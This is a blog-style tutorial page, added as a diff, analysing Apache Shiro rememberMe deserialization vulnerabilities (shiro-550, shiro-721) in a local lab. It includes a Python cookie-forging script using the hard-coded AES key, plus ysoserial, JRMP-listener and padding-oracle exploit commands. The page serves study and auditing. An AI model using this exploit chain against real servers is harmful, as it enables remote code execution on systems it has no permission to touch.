@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>shiro反序列化(shiro-550与shiro-721) - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "shiro\u53cd\u5e8f\u5217\u5316(shiro-550\u4e0eshiro-721)", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "shiro", url: "#shiro" },
+              {title: "shiro-550", url: "#shiro-550" },
+              {title: "shiro-721", url: "#shiro-721" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/" class="btn btn-xs btn-link">
+        shiro的tricks
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../shiro/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../shiro/" class="btn btn-xs btn-link">
+        shiro
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="shiroshiro-550shiro-721">shiro反序列化(shiro-550与shiro-721)</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#shiro">shiro</a><ul>
+<li><a href="#怎么判断是否是shiro网站">怎么判断是否是shiro网站</a></li>
+</ul>
+</li>
+<li><a href="#shiro-550">shiro-550</a><ul>
+<li><a href="#简介">简介</a></li>
+<li><a href="#前期准备">前期准备</a></li>
+<li><a href="#开始动调">开始动调</a><ul>
+<li><a href="#序列化加密">序列化，加密</a></li>
+<li><a href="#反序列化解密">反序列化，解密</a></li>
+<li><a href="#解密重写cookie以写入payload">解密，重写cookie，以写入payload</a></li>
+</ul>
+</li>
+<li><a href="#密钥获取">密钥获取</a></li>
+<li><a href="#利用">利用</a><ul>
+<li><a href="#URLDNS">URLDNS</a></li>
+<li><a href="#cc链2">cc链2</a></li>
+<li><a href="#JRMP">JRMP</a></li>
+</ul>
+</li>
+<li><a href="#小总结">小总结</a></li>
+<li><a href="#审计关键字">审计关键字</a></li>
+</ul>
+</li>
+<li><a href="#shiro-721">shiro-721</a><ul>
+<li><a href="#简介">简介</a></li>
+<li><a href="#环境搭建">环境搭建</a></li>
+<li><a href="#利用">利用</a></li>
+</ul>
+</li>
+</ul>
+<hr />
+<hr />
+<h2 id="shiro">shiro</h2>
+<p>Apache shiro 是java的一个安全框架，可以帮助完成认证，授权，加密，会话管理等功能。它不跟任何框架或容器绑定，可以独立运行。</p>
+<h3 id="shiro_1">怎么判断是否是shiro网站</h3>
+<p>发送cookie带有rememberMe=0的包，若返回包的头部有rememberMe，则为shiro站点</p>
+<h2 id="shiro-550">shiro-550</h2>
+<h3 id="_2">简介</h3>
+<p>当shiro版本小于1.2.5时，主要是由shiro的rememberMe内容反序列化导致的命令执行漏洞，造成的原因是AES密钥被硬编码在shiro源码中，这就导致了可以通过在cookie的rememberMe字段插入payload实现任意代码执行</p>
+<h3 id="_3">前期准备</h3>
+<p>git clone <a href="https://github.com/apache/shiro.git" title="https://github.com/apache/shiro.git">https://github.com/apache/shiro.git</a> 下载shiro</p>
+<p>然后 git checkout shiro-root-1.2.4,切换到1.2.4版本进行对应版本的漏洞调试</p>
+<p>编辑shiro/samples/web/pom.xml文件，在此处加入 1.2</p>
+<p><img alt="image-20210309141612431" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309141612431.png" title="image-20210309141612431" /></p>
+<p>然后idea打开shiro/samples/web 下的pom.xml,然后Run -&gt; Edit Configurations 添加TomcatServer</p>
+<p><img alt="image-20210309142858354" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309142858354.png" title="image-20210309142858354" /></p>
+<p>待idea加载完maven后，向tomcat部署工件</p>
+<p><img alt="image-20210309143500761" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309143500761.png" title="image-20210309143500761" /></p>
+<p>然后启动即可</p>
+<h3 id="_4">开始动调</h3>
+<h4 id="_5">序列化，加密</h4>
+<p>在org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin 处下断点</p>
+<p><img alt="image-20210309144449196" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309144449196.png" title="image-20210309144449196" /></p>
+<p>然后进入shiro登陆页面，勾选<em>rememberme</em>，进行登录，断点命中</p>
+<p><img alt="image-20210309144539506" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309144539506.png" title="image-20210309144539506" /></p>
+<p>然后会校验token里面的rememberme是否为true，若为true则执行rememberIdentity函数</p>
+<p>我们跟进rememberIdentity函数</p>
+<p><img alt="image-20210309145259149" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309145259149.png" title="image-20210309145259149" /></p>
+<p>发现principals变量获取了需要remember的用户名（此处为root），然后再调用重载函数rememberIdentity。
+这个函数调用了convertPrincipalsToBytes,我们跟进看看这个函数</p>
+<p><img alt="image-20210309145901675" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309145901675.png" title="image-20210309145901675" /></p>
+<p>可以发现对传入的principals调用了serialize方法，继续跟进serialize方法</p>
+<p><img alt="image-20210309150019544" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309150019544.png" title="image-20210309150019544" /></p>
+<p>继续跟进serialize会来到这个地方</p>
+<p><img alt="image-20210309150133277" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309150133277.png" title="image-20210309150133277" /></p>
+<p>发现就是对其调用了writeObject()这个原生反序列方法而已，没什么好康的，转回头去看看convertPrincipalsToBytes那个加密函数encrypt</p>
+<p><img alt="image-20210309152804516" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309152804516.png" title="image-20210309152804516" /></p>
+<p>发现通过getCipherService方法返回了一个东西，发现是加密方式等东西</p>
+<p><img alt="image-20210309153312468" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309153312468.png" title="image-20210309153312468" /></p>
+<p>在此处156行会调用另一个encrypt方法，其中第一个参数是序列化后的用户名，第二个参数则是密钥（这个密钥是硬编码写入文件的，所以造成了安全问题）我们跟进</p>
+<p><img alt="image-20210309154512813" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309154512813.png" title="image-20210309154512813" /></p>
+<p>这里的ivBytes是一个随机生成的iv（我没跟进细看),然后在这个方法最后它调用了encrypt的重载函数，并传入了序列化后的用户名，key，iv，以及一个true。我们继续跟进</p>
+<p><img alt="image-20210309155203309" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309155203309.png" title="image-20210309155203309" /></p>
+<p>可以发现通过arraycopy，把iv和加密后的密文数据（aes）放入了output,最后返回了output. 然后这个return会一直返回到此处</p>
+<p><img alt="image-20210309155606194" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309155606194.png" title="image-20210309155606194" /></p>
+<p>output的内容作为参数传入了rememberSerializedIdentity，跟进该函数</p>
+<p><img alt="image-20210309155736406" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309155736406.png" title="image-20210309155736406" /></p>
+<p>56行，把base64加密后的output作为值写入到cookie中的remembername键</p>
+<p><img alt="image-20210309162524164" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309162524164.png" title="image-20210309162524164" /></p>
+<p>57行将其返回给客户端</p>
+<p>burp抓包发现事实确实如此</p>
+<p><img alt="image-20210309162406182" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309162406182.png" title="image-20210309162406182" /></p>
+<p>另外说一下那个硬编码key，那个硬编码的key在AbstractRememberMeManager.class DEFAULT_CIPHER_KEY_BYTES里</p>
+<p><img alt="image-20210309163021784" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309163021784.png" title="image-20210309163021784" /></p>
+<p>可以发现通过getEncryptionCipherKey获得的key确实是DEFAULT_CIPHER_KEY_BYTES</p>
+<p><img alt="image-20210309164110278" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309164110278.png" title="image-20210309164110278" /></p>
+<p>我们简要的梳理一下这个流程， 当我们勾选rememberme后，用户名会被序列化处理，然后与硬编码的key，随机生成的iv一起进行加密，然后以 iv+密文 的base64编码返回给用户的键为rememberme的cookie里。</p>
+<h4 id="_6">反序列化，解密</h4>
+<p>在我们勾选rememberme登陆后，刷新，抓包，将其JSESSIONID删除，使shiro验证cookie中rememberme的值是否正确（如果不删除JSESSIONID，shiro则直接以JSESSIONID为登陆凭证了，就不会验证rememberme中的值了）</p>
+<p><img alt="image-20210309213036364" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213036364.png" title="image-20210309213036364" /></p>
+<p>在org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity 打下断点，放包，断点命中。</p>
+<p><img alt="image-20210309213222271" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213222271.png" title="image-20210309213222271" /></p>
+<p>跟进getRememberedPrincipals方法</p>
+<p><img alt="image-20210309213255317" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213255317.png" title="image-20210309213255317" /></p>
+<p>随后再跟进getRememberedSerializedIdentity</p>
+<p><img alt="image-20210309213345511" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213345511.png" title="image-20210309213345511" /></p>
+<p>关注这里的86行，此处的意思是从cookie中获得base64编码后的cookie值，随后在90行对其进行填充（CBC加密中的一个流程），95行进行base64解码，并将其返回</p>
+<p><img alt="image-20210309214329614" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214329614.png" title="image-20210309214329614" /></p>
+<p>随后我们回到getRememberedPrincipals方法，跟进其convertBytesToPrincipals方法</p>
+<p><img alt="image-20210309214559031" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214559031.png" title="image-20210309214559031" /></p>
+<p>发现其中有个decrypt方法，这里的decrypt方法就是对其行aes解密，取前十六位为IV。</p>
+<p><img alt="image-20210309214846036" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214846036.png" title="image-20210309214846036" /></p>
+<p>下面140行则是对其进行反序列化处理了。我们跟进一下</p>
+<p><img alt="image-20210309214941029" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214941029.png" title="image-20210309214941029" /></p>
+<p>再次跟进deserialize方法</p>
+<p><img alt="image-20210309215227753" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309215227753.png" title="image-20210309215227753" /></p>
+<p>看到readObject,就意味着反序列化流程结束了。</p>
+<p>梳理一下，cookie中remenber值传入后先base64解码，然后aes解密，然后反序列化。</p>
+<h4 id="cookiepayload">解密，重写cookie，以写入payload</h4>
+<p>既然key是固定的，我们知道了key是什么，同时在CBC解密的时候，IV的作用只是作为第一个区块去解密第二个区块（生成的结果去解密第三个区块，以此类推），所以IV可以为随机值没什么特别要求（只要能解密就行了）那么我们就可以自己伪造一个cookie。</p>
+<p>python脚本如下(嫖的笑师傅的)，序列化payload用base64格式传入</p>
+<pre><code class="language-text">##pip install pycrypto
+import sys
+import base64
+import uuid
+from random import Random
+import subprocess
+from Crypto.Cipher import AES
+
+key  =  &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;
+mode =  AES.MODE_CBC
+IV   = uuid.uuid4().bytes
+encryptor = AES.new(base64.b64decode(key), mode, IV)
+
+payload=base64.b64decode(sys.argv[1])
+BS   = AES.block_size
+pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+payload=pad(payload)
+
+print(base64.b64encode(IV + encryptor.encrypt(payload)))
+</code></pre>
+<p>然后我们只需要传入base64编码的，去除换行符的payload即可。</p>
+<p>像这样</p>
+<pre><code class="language-text">java -jar ./ysoserial-master-SNAPSHOT.jar URLDNS &quot;http://cao.7squwf.dnslog.cn&quot; |base64|sed ':label;N;s/\n//;b label'
+</code></pre>
+<h3 id="_7">密钥获取</h3>
+<p>有些时候key并不是一成不变的kPH+bIxk5D2deZiIxcaaaA==，而有可能是其他值，我们可以用工具<a href="https://github.com/insightglacier/Shiro_exploit" title="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a> 来爆破出密钥</p>
+<pre><code class="language-text">python .\shiro_exploit.py -u http://127.0.0.1:8080 
+</code></pre>
+<p>即可开始爆破，当然这个工具的作用不仅仅如此</p>
+<p><img alt="image-20210310132845771" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310132845771.png" title="image-20210310132845771" /></p>
+<h3 id="_8">利用</h3>
+<h4 id="urldns">URLDNS</h4>
+<p>这个链其实根本没啥危害..只是拿来测试一下有没有洞</p>
+<pre><code class="language-text">java -jar ./ysoserial-master-SNAPSHOT.jar URLDNS &quot;http://cao.7squwf.dnslog.cn&quot; |base64|sed ':label;N;s/\n//;b label'
+</code></pre>
+<p>生成payload，像cookie伪造脚本传入，获得伪造的cookie</p>
+<p><img alt="image-20210310115008147" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310115008147.png" title="image-20210310115008147" /></p>
+<p>rememberme登陆后，刷新抓包，删除cookie中的session，替换cookie中的rememberme为伪造后的cookie。放包,DNSLOG有反应</p>
+<p><img alt="image-20210310115425170" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310115425170.png" title="image-20210310115425170" /></p>
+<h4 id="cc2">cc链2</h4>
+<pre><code class="language-text">java -jar ./ysoserial-master-SNAPSHOT.jar CommonsCollections2 &quot;calc&quot;|base64 |sed ':label;N;s/\n//;b label'
+</code></pre>
+<p>然后制作cookie，发过去，成功弹计算器</p>
+<h4 id="jrmp">JRMP</h4>
+<p>通过运行mvn dependency:list 命令可以发现当前Commons Collections 的版本是3.2.1</p>
+<p>按理说会有cc链5，但是实际上用ysoserial 生成payload用上面的方法打过去后没有反应。看别人博客发现是这个原因 “Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。” 解决这种问题的办法是用JRMP</p>
+<p>vps上执行以下命令，监听端口</p>
+<pre><code class="language-text">java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12006 CommonsCollections5 'calc'
+</code></pre>
+<p>我们再通过ysoserial生成payload</p>
+<pre><code class="language-text">java -jar ysoserial-master-SNAPSHOT.jar JRMPClient 'vps_ip:12006'|base64|sed ':label;N;s/\n//;b label'
+</code></pre>
+<p>然后伪造cookie，发过去，成功弹计算器</p>
+<p><img alt="image-20210310194746492" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310194746492.png" title="image-20210310194746492" /></p>
+<h3 id="_9">小总结</h3>
+<p>这个洞因为cookie中的值使用硬编码的key加密而成，我们可以以此来伪造cookie，顺便在cookie里写入危险的paylaod如cc链payload，使cookie中的值被解密，随后经历反序列化，造成命令执行</p>
+<p>参考：<a href="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-反序列化漏洞" title="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E</a> 笑师傅大大</p>
+<h3 id="_10">审计关键字</h3>
+<p>可以直接通过搜索关键字setCipherKey或CookieRememberMeManager，来看看密钥是否硬编码在了代码中</p>
+<h2 id="shiro-721">shiro-721</h2>
+<p>去年学的Padding Oracle 在此处被利用了起来。可以先看看Padding Oracle Attack 大概是个啥</p>
+<p>影响版本：</p>
+<pre><code class="language-text">1.2.5, 
+1.2.6, 
+1.3.0, 
+1.3.1, 
+1.3.2, 
+1.4.0-RC2, 
+1.4.0, 
+1.4.1
+</code></pre>
+<h3 id="_11">简介</h3>
+<p>其实漏洞代码层面逻辑上和shiro-550大致相似，只不过key没有硬编码进代码中了。shiro的cookie使用aes-128-cbc加密
+只要我们获得一个rememberme用户的cookie后就可以通过padding oracle attack 伪造任意cookie发过去了，从而造成反序列化漏洞了</p>
+<h3 id="_12">环境搭建</h3>
+<p>在这里下载1.4.1的war包<a href="https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war，并放入tomcat" title="https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war，并放入tomcat">https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war，并放入tomcat</a> webapps文件夹，随后启动tomcat，访问<a href="http://127.0.0.1:8080/samples-web-1.4.1/" title="http://127.0.0.1:8080/samples-web-1.4.1/">http://127.0.0.1:8080/samples-web-1.4.1/</a></p>
+<p><img alt="image-20210310220716846" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310220716846.png" title="image-20210310220716846" /></p>
+<h3 id="_13">利用</h3>
+<p>大致逻辑与shiro-550差不多，直接说利用吧。</p>
+<p><a href="https://github.com/inspiringz/Shiro-721" title="https://github.com/inspiringz/Shiro-721">https://github.com/inspiringz/Shiro-721</a> 使用这个工具</p>
+<p>首先我们得勾选rememberme，抓包获得rememberme cookie</p>
+<p><img alt="image-20210310221230268" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310221230268.png" title="image-20210310221230268" /></p>
+<p>然后通过ysoserial生成payload，将其通过管道符传入某个文件，随后用刚刚那个工具里的shiro_exp.py</p>
+<pre><code class="language-text">python ./shiro_exp.py &lt;url&gt; &lt;cookie&gt; &lt;paylaod文件&gt;
+</code></pre>
+<p>随后会进行爆破，最后获得结果cookie后，传入并发包过去即可（爆破时间很长）</p>
+<p><img alt="image-20210310224415067" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310224415067.png" title="image-20210310224415067" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../shiro%E7%9A%84tricks/shiro%E7%9A%84tricks/" class="btn btn-xs btn-link">
+        shiro的tricks
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../shiro/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../shiro/" class="btn btn-xs btn-link">
+        shiro
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
